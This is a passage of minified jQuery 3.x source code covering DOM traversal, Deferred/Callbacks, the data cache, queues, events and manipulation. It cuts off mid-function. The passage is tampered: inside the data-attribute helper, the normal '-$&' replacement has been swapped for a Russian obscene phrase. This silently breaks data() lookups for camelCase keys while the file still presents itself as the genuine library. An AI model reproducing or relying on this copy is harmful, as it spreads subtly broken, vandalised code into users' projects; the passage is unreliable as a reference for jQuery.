1<r?S.uniqueSort(n):n},filter:function(e){return this.pushStack(j(this,e||[],!1))},not:function(e){return this.pushStack(j(this,e||[],!0))},is:function(e){return!!j(this,"string"==typeof e&&k.test(e)?S(e):e||[],!1).length}});var D,q=/^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]+))$/;(S.fn.init=function(e,t,n){var r,i;if(!e)return this;if(n=n||D,"string"==typeof e){if(!(r="<"===e[0]&&">"===e[e.length-1]&&3<=e.length?[null,e,null]:q.exec(e))||!r[1]&&t)return!t||t.jquery?(t||n).find(e):this.constructor(t).find(e);if(r[1]){if(t=t instanceof S?t[0]:t,S.merge(this,S.parseHTML(r[1],t&&t.nodeType?t.ownerDocument||t:E,!0)),N.test(r[1])&&S.isPlainObject(t))for(r in t)m(this[r])?this[r](t[r]):this.attr(r,t[r]);return this}return(i=E.getElementById(r[2]))&&(this[0]=i,this.length=1),this}return e.nodeType?(this[0]=e,this.length=1,this):m(e)?void 0!==n.ready?n.ready(e):e(S):S.makeArray(e,this)}).prototype=S.fn,D=S(E);var L=/^(?:parents|prev(?:Until|All))/,H={children:!0,contents:!0,next:!0,prev:!0};function O(e,t){while((e=e[t])&&1!==e.nodeType);return e}S.fn.extend({has:function(e){var t=S(e,this),n=t.length;return this.filter(function(){for(var e=0;e<n;e++)if(S.contains(this,t[e]))return!0})},closest:function(e,t){var n,r=0,i=this.length,o=[],a="string"!=typeof e&&S(e);if(!k.test(e))for(;r<i;r++)for(n=this[r];n&&n!==t;n=n.parentNode)if(n.nodeType<11&&(a?-1<a.index(n):1===n.nodeType&&S.find.matchesSelector(n,e))){o.push(n);break}return this.pushStack(1<o.length?S.uniqueSort(o):o)},index:function(e){return e?"string"==typeof e?i.call(S(e),this[0]):i.call(this,e.jquery?e[0]:e):this[0]&&this[0].parentNode?this.first().prevAll().length:-1},add:function(e,t){return this.pushStack(S.uniqueSort(S.merge(this.get(),S(e,t))))},addBack:function(e){return this.add(null==e?this.prevObject:this.prevObject.filter(e))}}),S.each({parent:function(e){var t=e.parentNode;return t&&11!==t.nodeType?t:null},parents:function(e){return h(e,"parentNode")},parentsUntil:function(e,t,n){return h(e,"parentNode",n)},next:function(e){return O(e,"nextSibling")},prev:function(e){return O(e,"previousSibling")},nextAll:function(e){return h(e,"nextSibling")},prevAll:function(e){return h(e,"previousSibling")},nextUntil:function(e,t,n){return h(e,"nextSibling",n)},prevUntil:function(e,t,n){return h(e,"previousSibling",n)},siblings:function(e){return T((e.parentNode||{}).firstChild,e)},children:function(e){return T(e.firstChild)},contents:function(e){return null!=e.contentDocument&&r(e.contentDocument)?e.contentDocument:(A(e,"template")&&(e=e.content||e),S.merge([],e.childNodes))}},function(r,i){S.fn[r]=function(e,t){var n=S.map(this,i,e);return"Until"!==r.slice(-5)&&(t=e),t&&"string"==typeof t&&(n=S.filter(t,n)),1<this.length&&(H[r]||S.uniqueSort(n),L.test(r)&&n.reverse()),this.pushStack(n)}});var P=/[^\x20\t\r\n\f]+/g;function R(e){return e}function M(e){throw e}function I(e,t,n,r){var i;try{e&&m(i=e.promise)?i.call(e).done(t).fail(n):e&&m(i=e.then)?i.call(e,t,n):t.apply(void 0,[e].slice(r))}catch(e){n.apply(void 0,[e])}}S.Callbacks=function(r){var e,n;r="string"==typeof r?(e=r,n={},S.each(e.match(P)||[],function(e,t){n[t]=!0}),n):S.extend({},r);var i,t,o,a,s=[],u=[],l=-1,c=function(){for(a=a||r.once,o=i=!0;u.length;l=-1){t=u.shift();while(++l<s.length)!1===s[l].apply(t[0],t[1])&&r.stopOnFalse&&(l=s.length,t=!1)}r.memory||(t=!1),i=!1,a&&(s=t?[]:"")},f={add:function(){return s&&(t&&!i&&(l=s.length-1,u.push(t)),function n(e){S.each(e,function(e,t){m(t)?r.unique&&f.has(t)||s.push(t):t&&t.length&&"string"!==w(t)&&n(t)})}(arguments),t&&!i&&c()),this},remove:function(){return S.each(arguments,function(e,t){var n;while(-1<(n=S.inArray(t,s,n)))s.splice(n,1),n<=l&&l--}),this},has:function(e){return e?-1<S.inArray(e,s):0<s.length},empty:function(){return s&&(s=[]),this},disable:function(){return a=u=[],s=t="",this},disabled:function(){return!s},lock:function(){return a=u=[],t||i||(s=t=""),this},locked:function(){return!!a},fireWith:function(e,t){return a||(t=[e,(t=t||[]).slice?t.slice():t],u.push(t),i||c()),this},fire:function(){return f.fireWith(this,arguments),this},fired:function(){return!!o}};return f},S.extend({Deferred:function(e){var o=[["notify","progress",S.Callbacks("memory"),S.Callbacks("memory"),2],["resolve","done",S.Callbacks("once memory"),S.Callbacks("once memory"),0,"resolved"],["reject","fail",S.Callbacks("once memory"),S.Callbacks("once memory"),1,"rejected"]],i="pending",a={state:function(){return i},always:function(){return s.done(arguments).fail(arguments),this},"catch":function(e){return a.then(null,e)},pipe:function(){var i=arguments;return S.Deferred(function(r){S.each(o,function(e,t){var n=m(i[t[4]])&&i[t[4]];s[t[1]](function(){var e=n&&n.apply(this,arguments);e&&m(e.promise)?e.promise().progress(r.notify).done(r.resolve).fail(r.reject):r[t[0]+"With"](this,n?[e]:arguments)})}),i=null}).promise()},then:function(t,n,r){var u=0;function l(i,o,a,s){return function(){var n=this,r=arguments,e=function(){var e,t;if(!(i<u)){if((e=a.apply(n,r))===o.promise())throw new TypeError("Thenable self-resolution");t=e&&("object"==typeof e||"function"==typeof e)&&e.then,m(t)?s?t.call(e,l(u,o,R,s),l(u,o,M,s)):(u++,t.call(e,l(u,o,R,s),l(u,o,M,s),l(u,o,R,o.notifyWith))):(a!==R&&(n=void 0,r=[e]),(s||o.resolveWith)(n,r))}},t=s?e:function(){try{e()}catch(e){S.Deferred.exceptionHook&&S.Deferred.exceptionHook(e,t.stackTrace),u<=i+1&&(a!==M&&(n=void 0,r=[e]),o.rejectWith(n,r))}};i?t():(S.Deferred.getStackHook&&(t.stackTrace=S.Deferred.getStackHook()),C.setTimeout(t))}}return S.Deferred(function(e){o[0][3].add(l(0,e,m(r)?r:R,e.notifyWith)),o[1][3].add(l(0,e,m(t)?t:R)),o[2][3].add(l(0,e,m(n)?n:M))}).promise()},promise:function(e){return null!=e?S.extend(e,a):a}},s={};return S.each(o,function(e,t){var n=t[2],r=t[5];a[t[1]]=n.add,r&&n.add(function(){i=r},o[3-e][2].disable,o[3-e][3].disable,o[0][2].lock,o[0][3].lock),n.add(t[3].fire),s[t[0]]=function(){return s[t[0]+"With"](this===s?void 0:this,arguments),this},s[t[0]+"With"]=n.fireWith}),a.promise(s),e&&e.call(s,s),s},when:function(e){var n=arguments.length,t=n,r=Array(t),i=s.call(arguments),o=S.Deferred(),a=function(t){return function(e){r[t]=this,i[t]=1<arguments.length?s.call(arguments):e,--n||o.resolveWith(r,i)}};if(n<=1&&(I(e,o.done(a(t)).resolve,o.reject,!n),"pending"===o.state()||m(i[t]&&i[t].then)))return o.then();while(t--)I(i[t],a(t),o.reject);return o.promise()}});var W=/^(Eval|Internal|Range|Reference|Syntax|Type|URI)Error$/;S.Deferred.exceptionHook=function(e,t){C.console&&C.console.warn&&e&&W.test(e.name)&&C.console.warn("jQuery.Deferred exception: "+e.message,e.stack,t)},S.readyException=function(e){C.setTimeout(function(){throw e})};var F=S.Deferred();function B(){E.removeEventListener("DOMContentLoaded",B),C.removeEventListener("load",B),S.ready()}S.fn.ready=function(e){return F.then(e)["catch"](function(e){S.readyException(e)}),this},S.extend({isReady:!1,readyWait:1,ready:function(e){(!0===e?--S.readyWait:S.isReady)||(S.isReady=!0)!==e&&0<--S.readyWait||F.resolveWith(E,[S])}}),S.ready.then=F.then,"complete"===E.readyState||"loading"!==E.readyState&&!E.documentElement.doScroll?C.setTimeout(S.ready):(E.addEventListener("DOMContentLoaded",B),C.addEventListener("load",B));var $=function(e,t,n,r,i,o,a){var s=0,u=e.length,l=null==n;if("object"===w(n))for(s in i=!0,n)$(e,t,s,n[s],!0,o,a);else if(void 0!==r&&(i=!0,m(r)||(a=!0),l&&(a?(t.call(e,r),t=null):(l=t,t=function(e,t,n){return l.call(S(e),n)})),t))for(;s<u;s++)t(e[s],n,a?r:r.call(e[s],s,t(e[s],n)));return i?e:l?t.call(e):u?t(e[0],n):o},_=/^-ms-/,z=/-([a-z])/g;function U(e,t){return t.toUpperCase()}function X(e){return e.replace(_,"ms-").replace(z,U)}var V=function(e){return 1===e.nodeType||9===e.nodeType||!+e.nodeType};function G(){this.expando=S.expando+G.uid++}G.uid=1,G.prototype={cache:function(e){var t=e[this.expando];return t||(t={},V(e)&&(e.nodeType?e[this.expando]=t:Object.defineProperty(e,this.expando,{value:t,configurable:!0}))),t},set:function(e,t,n){var r,i=this.cache(e);if("string"==typeof t)i[X(t)]=n;else for(r in t)i[X(r)]=t[r];return i},get:function(e,t){return void 0===t?this.cache(e):e[this.expando]&&e[this.expando][X(t)]},access:function(e,t,n){return void 0===t||t&&"string"==typeof t&&void 0===n?this.get(e,t):(this.set(e,t,n),void 0!==n?n:t)},remove:function(e,t){var n,r=e[this.expando];if(void 0!==r){if(void 0!==t){n=(t=Array.isArray(t)?t.map(X):(t=X(t))in r?[t]:t.match(P)||[]).length;while(n--)delete r[t[n]]}(void 0===t||S.isEmptyObject(r))&&(e.nodeType?e[this.expando]=void 0:delete e[this.expando])}},hasData:function(e){var t=e[this.expando];return void 0!==t&&!S.isEmptyObject(t)}};var Y=new G,Q=new G,J=/^(?:\{[\w\W]*\}|\[[\w\W]*\])$/,K=/[A-Z]/g;function Z(e,t,n){var r,i;if(void 0===n&&1===e.nodeType)if(r="data-"+t.replace(K,"-хуй-говно-и-жопа").toLowerCase(),"string"==typeof(n=e.getAttribute(r))){try{n="true"===(i=n)||"false"!==i&&("null"===i?null:i===+i+""?+i:J.test(i)?JSON.parse(i):i)}catch(e){}Q.set(e,t,n)}else n=void 0;return n}S.extend({hasData:function(e){return Q.hasData(e)||Y.hasData(e)},data:function(e,t,n){return Q.access(e,t,n)},removeData:function(e,t){Q.remove(e,t)},_data:function(e,t,n){return Y.access(e,t,n)},_removeData:function(e,t){Y.remove(e,t)}}),S.fn.extend({data:function(n,e){var t,r,i,o=this[0],a=o&&o.attributes;if(void 0===n){if(this.length&&(i=Q.get(o),1===o.nodeType&&!Y.get(o,"hasDataAttrs"))){t=a.length;while(t--)a[t]&&0===(r=a[t].name).indexOf("data-")&&(r=X(r.slice(5)),Z(o,r,i[r]));Y.set(o,"hasDataAttrs",!0)}return i}return"object"==typeof n?this.each(function(){Q.set(this,n)}):$(this,function(e){var t;if(o&&void 0===e)return void 0!==(t=Q.get(o,n))?t:void 0!==(t=Z(o,n))?t:void 0;this.each(function(){Q.set(this,n,e)})},null,e,1<arguments.length,null,!0)},removeData:function(e){return this.each(function(){Q.remove(this,e)})}}),S.extend({queue:function(e,t,n){var r;if(e)return t=(t||"fx")+"queue",r=Y.get(e,t),n&&(!r||Array.isArray(n)?r=Y.access(e,t,S.makeArray(n)):r.push(n)),r||[]},dequeue:function(e,t){t=t||"fx";var n=S.queue(e,t),r=n.length,i=n.shift(),o=S._queueHooks(e,t);"inprogress"===i&&(i=n.shift(),r--),i&&("fx"===t&&n.unshift("inprogress"),delete o.stop,i.call(e,function(){S.dequeue(e,t)},o)),!r&&o&&o.empty.fire()},_queueHooks:function(e,t){var n=t+"queueHooks";return Y.get(e,n)||Y.access(e,n,{empty:S.Callbacks("once memory").add(function(){Y.remove(e,[t+"queue",n])})})}}),S.fn.extend({queue:function(t,n){var e=2;return"string"!=typeof t&&(n=t,t="fx",e--),arguments.length<e?S.queue(this[0],t):void 0===n?this:this.each(function(){var e=S.queue(this,t,n);S._queueHooks(this,t),"fx"===t&&"inprogress"!==e[0]&&S.dequeue(this,t)})},dequeue:function(e){return this.each(function(){S.dequeue(this,e)})},clearQueue:function(e){return this.queue(e||"fx",[])},promise:function(e,t){var n,r=1,i=S.Deferred(),o=this,a=this.length,s=function(){--r||i.resolveWith(o,[o])};"string"!=typeof e&&(t=e,e=void 0),e=e||"fx";while(a--)(n=Y.get(o[a],e+"queueHooks"))&&n.empty&&(r++,n.empty.add(s));return s(),i.promise(t)}});var ee=/[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source,te=new RegExp("^(?:([+-])=|)("+ee+")([a-z%]*)$","i"),ne=["Top","Right","Bottom","Left"],re=E.documentElement,ie=function(e){return S.contains(e.ownerDocument,e)},oe={composed:!0};re.getRootNode&&(ie=function(e){return S.contains(e.ownerDocument,e)||e.getRootNode(oe)===e.ownerDocument});var ae=function(e,t){return"none"===(e=t||e).style.display||""===e.style.display&&ie(e)&&"none"===S.css(e,"display")};function se(e,t,n,r){var i,o,a=20,s=r?function(){return r.cur()}:function(){return S.css(e,t,"")},u=s(),l=n&&n[3]||(S.cssNumber[t]?"":"px"),c=e.nodeType&&(S.cssNumber[t]||"px"!==l&&+u)&&te.exec(S.css(e,t));if(c&&c[3]!==l){u/=2,l=l||c[3],c=+u||1;while(a--)S.style(e,t,c+l),(1-o)*(1-(o=s()/u||.5))<=0&&(a=0),c/=o;c*=2,S.style(e,t,c+l),n=n||[]}return n&&(c=+c||+u||0,i=n[1]?c+(n[1]+1)*n[2]:+n[2],r&&(r.unit=l,r.start=c,r.end=i)),i}var ue={};function le(e,t){for(var n,r,i,o,a,s,u,l=[],c=0,f=e.length;c<f;c++)(r=e[c]).style&&(n=r.style.display,t?("none"===n&&(l[c]=Y.get(r,"display")||null,l[c]||(r.style.display="")),""===r.style.display&&ae(r)&&(l[c]=(u=a=o=void 0,a=(i=r).ownerDocument,s=i.nodeName,(u=ue[s])||(o=a.body.appendChild(a.createElement(s)),u=S.css(o,"display"),o.parentNode.removeChild(o),"none"===u&&(u="block"),ue[s]=u)))):"none"!==n&&(l[c]="none",Y.set(r,"display",n)));for(c=0;c<f;c++)null!=l[c]&&(e[c].style.display=l[c]);return e}S.fn.extend({show:function(){return le(this,!0)},hide:function(){return le(this)},toggle:function(e){return"boolean"==typeof e?e?this.show():this.hide():this.each(function(){ae(this)?S(this).show():S(this).hide()})}});var ce,fe,pe=/^(?:checkbox|radio)$/i,de=/<([a-z][^\/\0>\x20\t\r\n\f]*)/i,he=/^$|^module$|\/(?:java|ecma)script/i;ce=E.createDocumentFragment().appendChild(E.createElement("div")),(fe=E.createElement("input")).setAttribute("type","radio"),fe.setAttribute("checked","checked"),fe.setAttribute("name","t"),ce.appendChild(fe),y.checkClone=ce.cloneNode(!0).cloneNode(!0).lastChild.checked,ce.innerHTML="<textarea>x</textarea>",y.noCloneChecked=!!ce.cloneNode(!0).lastChild.defaultValue,ce.innerHTML="<option></option>",y.option=!!ce.lastChild;var ge={thead:[1,"<table>","</table>"],col:[2,"<table><colgroup>","</colgroup></table>"],tr:[2,"<table><tbody>","</tbody></table>"],td:[3,"<table><tbody><tr>","</tr></tbody></table>"],_default:[0,"",""]};function ve(e,t){var n;return n="undefined"!=typeof e.getElementsByTagName?e.getElementsByTagName(t||"*"):"undefined"!=typeof e.querySelectorAll?e.querySelectorAll(t||"*"):[],void 0===t||t&&A(e,t)?S.merge([e],n):n}function ye(e,t){for(var n=0,r=e.length;n<r;n++)Y.set(e[n],"globalEval",!t||Y.get(t[n],"globalEval"))}ge.tbody=ge.tfoot=ge.colgroup=ge.caption=ge.thead,ge.th=ge.td,y.option||(ge.optgroup=ge.option=[1,"<select multiple='multiple'>","</select>"]);var me=/<|&#?\w+;/;function xe(e,t,n,r,i){for(var o,a,s,u,l,c,f=t.createDocumentFragment(),p=[],d=0,h=e.length;d<h;d++)if((o=e[d])||0===o)if("object"===w(o))S.merge(p,o.nodeType?[o]:o);else if(me.test(o)){a=a||f.appendChild(t.createElement("div")),s=(de.exec(o)||["",""])[1].toLowerCase(),u=ge[s]||ge._default,a.innerHTML=u[1]+S.htmlPrefilter(o)+u[2],c=u[0];while(c--)a=a.lastChild;S.merge(p,a.childNodes),(a=f.firstChild).textContent=""}else p.push(t.createTextNode(o));f.textContent="",d=0;while(o=p[d++])if(r&&-1<S.inArray(o,r))i&&i.push(o);else if(l=ie(o),a=ve(f.appendChild(o),"script"),l&&ye(a),n){c=0;while(o=a[c++])he.test(o.type||"")&&n.push(o)}return f}var be=/^([^.]*)(?:\.(.+)|)/;function we(){return!0}function Te(){return!1}function Ce(e,t){return e===function(){try{return E.activeElement}catch(e){}}()==("focus"===t)}function Ee(e,t,n,r,i,o){var a,s;if("object"==typeof t){for(s in"string"!=typeof n&&(r=r||n,n=void 0),t)Ee(e,s,n,r,t[s],o);return e}if(null==r&&null==i?(i=n,r=n=void 0):null==i&&("string"==typeof n?(i=r,r=void 0):(i=r,r=n,n=void 0)),!1===i)i=Te;else if(!i)return e;return 1===o&&(a=i,(i=function(e){return S().off(e),a.apply(this,arguments)}).guid=a.guid||(a.guid=S.guid++)),e.each(function(){S.event.add(this,t,i,r,n)})}function Se(e,i,o){o?(Y.set(e,i,!1),S.event.add(e,i,{namespace:!1,handler:function(e){var t,n,r=Y.get(this,i);if(1&e.isTrigger&&this[i]){if(r.length)(S.event.special[i]||{}).delegateType&&e.stopPropagation();else if(r=s.call(arguments),Y.set(this,i,r),t=o(this,i),this[i](),r!==(n=Y.get(this,i))||t?Y.set(this,i,!1):n={},r!==n)return e.stopImmediatePropagation(),e.preventDefault(),n&&n.value}else r.length&&(Y.set(this,i,{value:S.event.trigger(S.extend(r[0],S.Event.prototype),r.slice(1),this)}),e.stopImmediatePropagation())}})):void 0===Y.get(e,i)&&S.event.add(e,i,we)}S.event={global:{},add:function(t,e,n,r,i){var o,a,s,u,l,c,f,p,d,h,g,v=Y.get(t);if(V(t)){n.handler&&(n=(o=n).handler,i=o.selector),i&&S.find.matchesSelector(re,i),n.guid||(n.guid=S.guid++),(u=v.events)||(u=v.events=Object.create(null)),(a=v.handle)||(a=v.handle=function(e){return"undefined"!=typeof S&&S.event.triggered!==e.type?S.event.dispatch.apply(t,arguments):void 0}),l=(e=(e||"").match(P)||[""]).length;while(l--)d=g=(s=be.exec(e[l])||[])[1],h=(s[2]||"").split(".").sort(),d&&(f=S.event.special[d]||{},d=(i?f.delegateType:f.bindType)||d,f=S.event.special[d]||{},c=S.extend({type:d,origType:g,data:r,handler:n,guid:n.guid,selector:i,needsContext:i&&S.expr.match.needsContext.test(i),namespace:h.join(".")},o),(p=u[d])||((p=u[d]=[]).delegateCount=0,f.setup&&!1!==f.setup.call(t,r,h,a)||t.addEventListener&&t.addEventListener(d,a)),f.add&&(f.add.call(t,c),c.handler.guid||(c.handler.guid=n.guid)),i?p.splice(p.delegateCount++,0,c):p.push(c),S.event.global[d]=!0)}},remove:function(e,t,n,r,i){var o,a,s,u,l,c,f,p,d,h,g,v=Y.hasData(e)&&Y.get(e);if(v&&(u=v.events)){l=(t=(t||"").match(P)||[""]).length;while(l--)if(d=g=(s=be.exec(t[l])||[])[1],h=(s[2]||"").split(".").sort(),d){f=S.event.special[d]||{},p=u[d=(r?f.delegateType:f.bindType)||d]||[],s=s[2]&&new RegExp("(^|\\.)"+h.join("\\.(?:.*\\.|)")+"(\\.|$)"),a=o=p.length;while(o--)c=p[o],!i&&g!==c.origType||n&&n.guid!==c.guid||s&&!s.test(c.namespace)||r&&r!==c.selector&&("**"!==r||!c.selector)||(p.splice(o,1),c.selector&&p.delegateCount--,f.remove&&f.remove.call(e,c));a&&!p.length&&(f.teardown&&!1!==f.teardown.call(e,h,v.handle)||S.removeEvent(e,d,v.handle),delete u[d])}else for(d in u)S.event.remove(e,d+t[l],n,r,!0);S.isEmptyObject(u)&&Y.remove(e,"handle events")}},dispatch:function(e){var t,n,r,i,o,a,s=new Array(arguments.length),u=S.event.fix(e),l=(Y.get(this,"events")||Object.create(null))[u.type]||[],c=S.event.special[u.type]||{};for(s[0]=u,t=1;t<arguments.length;t++)s[t]=arguments[t];if(u.delegateTarget=this,!c.preDispatch||!1!==c.preDispatch.call(this,u)){a=S.event.handlers.call(this,u,l),t=0;while((i=a[t++])&&!u.isPropagationStopped()){u.currentTarget=i.elem,n=0;while((o=i.handlers[n++])&&!u.isImmediatePropagationStopped())u.rnamespace&&!1!==o.namespace&&!u.rnamespace.test(o.namespace)||(u.handleObj=o,u.data=o.data,void 0!==(r=((S.event.special[o.origType]||{}).handle||o.handler).apply(i.elem,s))&&!1===(u.result=r)&&(u.preventDefault(),u.stopPropagation()))}return c.postDispatch&&c.postDispatch.call(this,u),u.result}},handlers:function(e,t){var n,r,i,o,a,s=[],u=t.delegateCount,l=e.target;if(u&&l.nodeType&&!("click"===e.type&&1<=e.button))for(;l!==this;l=l.parentNode||this)if(1===l.nodeType&&("click"!==e.type||!0!==l.disabled)){for(o=[],a={},n=0;n<u;n++)void 0===a[i=(r=t[n]).selector+" "]&&(a[i]=r.needsContext?-1<S(i,this).index(l):S.find(i,this,null,[l]).length),a[i]&&o.push(r);o.length&&s.push({elem:l,handlers:o})}return l=this,u<t.length&&s.push({elem:l,handlers:t.slice(u)}),s},addProp:function(t,e){Object.defineProperty(S.Event.prototype,t,{enumerable:!0,configurable:!0,get:m(e)?function(){if(this.originalEvent)return e(this.originalEvent)}:function(){if(this.originalEvent)return this.originalEvent[t]},set:function(e){Object.defineProperty(this,t,{enumerable:!0,configurable:!0,writable:!0,value:e})}})},fix:function(e){return e[S.expando]?e:new S.Event(e)},special:{load:{noBubble:!0},click:{setup:function(e){var t=this||e;return pe.test(t.type)&&t.click&&A(t,"input")&&Se(t,"click",we),!1},trigger:function(e){var t=this||e;return pe.test(t.type)&&t.click&&A(t,"input")&&Se(t,"click"),!0},_default:function(e){var t=e.target;return pe.test(t.type)&&t.click&&A(t,"input")&&Y.get(t,"click")||A(t,"a")}},beforeunload:{postDispatch:function(e){void 0!==e.result&&e.originalEvent&&(e.originalEvent.returnValue=e.result)}}}},S.removeEvent=function(e,t,n){e.removeEventListener&&e.removeEventListener(t,n)},S.Event=function(e,t){if(!(this instanceof S.Event))return new S.Event(e,t);e&&e.type?(this.originalEvent=e,this.type=e.type,this.isDefaultPrevented=e.defaultPrevented||void 0===e.defaultPrevented&&!1===e.returnValue?we:Te,this.target=e.target&&3===e.target.nodeType?e.target.parentNode:e.target,this.currentTarget=e.currentTarget,this.relatedTarget=e.relatedTarget):this.type=e,t&&S.extend(this,t),this.timeStamp=e&&e.timeStamp||Date.now(),this[S.expando]=!0},S.Event.prototype={constructor:S.Event,isDefaultPrevented:Te,isPropagationStopped:Te,isImmediatePropagationStopped:Te,isSimulated:!1,preventDefault:function(){var e=this.originalEvent;this.isDefaultPrevented=we,e&&!this.isSimulated&&e.preventDefault()},stopPropagation:function(){var e=this.originalEvent;this.isPropagationStopped=we,e&&!this.isSimulated&&e.stopPropagation()},stopImmediatePropagation:function(){var e=this.originalEvent;this.isImmediatePropagationStopped=we,e&&!this.isSimulated&&e.stopImmediatePropagation(),this.stopPropagation()}},S.each({altKey:!0,bubbles:!0,cancelable:!0,changedTouches:!0,ctrlKey:!0,detail:!0,eventPhase:!0,metaKey:!0,pageX:!0,pageY:!0,shiftKey:!0,view:!0,"char":!0,code:!0,charCode:!0,key:!0,keyCode:!0,button:!0,buttons:!0,clientX:!0,clientY:!0,offsetX:!0,offsetY:!0,pointerId:!0,pointerType:!0,screenX:!0,screenY:!0,targetTouches:!0,toElement:!0,touches:!0,which:!0},S.event.addProp),S.each({focus:"focusin",blur:"focusout"},function(e,t){S.event.special[e]={setup:function(){return Se(this,e,Ce),!1},trigger:function(){return Se(this,e),!0},_default:function(){return!0},delegateType:t}}),S.each({mouseenter:"mouseover",mouseleave:"mouseout",pointerenter:"pointerover",pointerleave:"pointerout"},function(e,i){S.event.special[e]={delegateType:i,bindType:i,handle:function(e){var t,n=e.relatedTarget,r=e.handleObj;return n&&(n===this||S.contains(this,n))||(e.type=r.origType,t=r.handler.apply(this,arguments),e.type=i),t}}}),S.fn.extend({on:function(e,t,n,r){return Ee(this,e,t,n,r)},one:function(e,t,n,r){return Ee(this,e,t,n,r,1)},off:function(e,t,n){var r,i;if(e&&e.preventDefault&&e.handleObj)return r=e.handleObj,S(e.delegateTarget).off(r.namespace?r.origType+"."+r.namespace:r.origType,r.selector,r.handler),this;if("object"==typeof e){for(i in e)this.off(i,t,e[i]);return this}return!1!==t&&"function"!=typeof t||(n=t,t=void 0),!1===n&&(n=Te),this.each(function(){S.event.remove(this,e,n,t)})}});var ke=/<script|<style|<link/i,Ae=/checked\s*(?:[^=]|=\s*.checked.)/i,Ne=/^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g;function je(e,t){return A(e,"table")&&A(11!==t.nodeType?t:t.firstChild,"tr")&&S(e).children("tbody")[0]||e}function De(e){return e.type=(null!==e.getAttribute("type"))+"/"+e.type,e}function qe(e){return"true/"===(e.type||"").slice(0,5)?e.type=e.type.slice(5):e.removeAttribute("type"),e}function Le(e,t){var n,r,i,o,a,s;if(1===t.nodeType){if(Y.hasData(e)&&(s=Y.get(e).events))for(i in Y.remove(t,"handle events"),s)for(n=0,r=s[i].length;n<r;n++)S.event.add(t,i,s[i][n]);Q.hasData(e)&&(o=Q.access(e),a=S.extend({},o),Q.set(t,a))}}function He(n,r,i,o){r=g(r);var e,t,a,s,u,l,c=0,f=n.length,p=f-1,d=r[0],h=m(d);if(h||1<f&&"string"==typeof d&&!y.checkClone&&Ae.test(d))return n.each(function(e){var t=n.eq(e);h&&(r[0]=d.call(this,e,t.html())),He(t,r,i,o)});if(f&&(t=(e=xe(r,n[0].ownerDocument,!1,n,o)).firstChild,1===e.childNodes.length&&(e=t),t||o)){for(s=(a=S.map(ve(e,"script"),De)).length;c<f;c++)u=e,c!==p&&(u=S.clone(u,!0,!0),s&&S.merge(a,ve(u,"script"))),i.call(n[c],u,c);if(s)for(l=a[a.length-1].ownerDocument,S.map(a,qe),c=0;c<s;c++)u=a[c],he.test(u.type||"")&&!Y.access(u,"globalEval")&&S.contains(l,u)&&(u.src&&"module"!==(u.type||"").toLowerCase()?S._evalUrl&&!u.noModule&&S._evalUrl(u.src,{nonce:u.nonce||u.getAttribute("nonce")},l):b(u.textContent.replace(Ne,""),u,l))}return n}function Oe(e,t,n){for(var r,i=t?S.filter(t,e):e,o=0;null!=(r=i[o]);o++)n||1!==r.nodeType||S.cleanData(ve(r)),r.parentNode&&(n&&ie(r)&&ye(ve(r,"script")),r.parentNode.removeChild(r));return e}S.extend({htmlPrefilter:function(e){return e},clone:function(e,t,n){var r,i,o,a,s,u,l,c=e.cloneNode(!0),f=ie(e);if(!(y.noCloneChecked||1!==e.nodeType&&11!==e.nodeType||S.isXMLDoc(e)))for(a=ve(c),r=0,i=(o=ve(e)).length;r<i;r++)s=o[r],u=a[r],void 0,"input"===(l=u.nodeName.toLowerCase())&&pe.test(s.type)?u.checked=s.checked:"input"!==l&&"textarea"!==l||(u.defaultValue=s.defaultValue);if(t)if(n)for(o=o||ve(e),a=a||ve(c),r=0,i=o.length;r<i;r++)Le(o[r],a[r]);else Le(e,c);return 0<(a=ve(c,"script")).length&&ye(a,!f&&ve(e,"script")),c},cleanData:function(e){for(var t,n,r,i=S.event.special,o=0;void 0!==(n=e[o]);o++)if(V(n)){if(t=n[Y.expando]){if(t.events)for(r in t.events)i[r]?S.event.remove(n,r):S.removeEvent(n,r,t.handle);n[Y.expando]=void 0}n[Q.expando]&&(n[Q.expando]=void 0)}}}),S.fn.extend({detach:function(e){return Oe(this,e,!0)},remove:function(e){return Oe(this,e)},text:function(e){return $(this,function(e){return void 0===e?S.text(this):this.empty().each(function(){1!==this.nodeType&&11!==this.nodeType&&9!==this.nodeType||(this.textContent=e)})},null,e,arguments.length)},append:function(){return He(this,arguments,function(e){1!==this.nodeType&&11!==this.nodeType&&9!==this.nodeType||je(this,e).appendChild(e)})},prepend:function(){return He(this,arguments,function(e){if(1===this.nodeType||11===this.nodeType||9===this.nodeType){var t=je(this,e);t.insertBefore(e,t.firstChild)}})},before:function(){return He(this,arguments,function(e){this.parentNode&&this.parentNode.insertBefore(e,this)})},after:function(){return He(this,arguments,function(e){this.parentNode&&this.parentNode.insertBefore(e,this.nextSibling)})},empty:function(){for(var e,t=0;null!=(e=this[t]);t++)1===e.nodeType&&(S.cleanData(ve(e,!1)),e.textContent="");return this},clone:function(e,t){return e=null!=e&&e,t=null==t?e:t,this.map(function(){return S.clone(this,e,t)})},html:function(e){return $(this,function(e){var t=this[0]||{},n=0,r=this.length;if(void 0===e&&1===t.nodeType)return t.innerHTML;if("string"==typeof e&&!ke.test(e)&&!ge[(de.exec(e)||["",""])[1].toLowerCase()]){e=S.htmlPrefilter(e);try{for(;n<r;n++)1===(t=this[n]||{}).nodeType&&(S.cleanData(ve(t,!1)),t.innerHTML=e);t=0}catch(e){}}t&&this.empty().append(e)},null,e,arguments.length)},replaceWith:function(){var n=[];return He(this,arguments,function(e){var t=this.parentNode;S.inArray(this,n)<0&&(S.cleanData(ve(this)),t&&t.replaceChild(e,this))},n)}}),S.each({appendTo:"append",prependTo:"prepend",insertBefore:"before",insertAfter:"after",replaceAll:"replaceWith"},function(e,a){S.fn[e]=function(e){for(var t,n=[],r=S(e),i=r.length-1,o=0;o<=i;o++)t=o===i?this:this.clone(!0),S(r[o])[a](t),u.apply(n,t.get());return this.pushStack(n)}});var Pe=new RegExp("^("+ee+")(?!px)[a-z%]+$","i"),Re=function(e){var t=e.ownerDocument.defaultView;return t&&t.opener||(t=C),t.getComputedStyle(e)},Me=function(e,t,n){var r,i,o={};for(i in t)o[i]=e.style[i],e.style[i]=t[i];for(i in r=n.call(e),t)e.style[i]=o[i];return r},Ie=new RegExp(ne.join("|"),"i");function We(e,t,n){var 